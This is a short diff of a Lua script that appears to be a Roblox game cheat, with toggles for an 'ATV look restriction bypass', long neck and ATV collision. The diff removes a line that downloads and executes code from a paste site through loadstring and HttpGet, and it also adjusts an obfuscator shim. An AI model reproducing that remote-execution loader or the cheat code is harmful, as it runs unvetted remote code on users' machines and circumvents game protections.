@@ -1,5 +1,5 @@
-local function LPH_JIT_MAX(f)
-    return f
+if not LPH_OBFUSCATED then
+    LPH_JIT_MAX = function(...) return ... end
 end
 
 -- Services
@@ -36,8 +36,6 @@ local isSpeedToggled = false
 
 local timechangerEnabled = true
 local time = 12
-
-loadstring(game:HttpGet("https://pastefy.app/Ocs7rkg0/raw",true))()
 
 -- ATV Look Restriction Bypass
 local trident = { gc = { camera = nil } }
@@ -164,7 +162,6 @@ UserInputService.InputBegan:Connect(function(input, isProcessed)
     if isProcessed then return end
 
     if input.KeyCode == Enum.KeyCode.L then
-        print("L key pressed") -- Debug message
         toggleLongNeck()
     elseif input.KeyCode == Enum.KeyCode.F then
         toggleATVCollision()
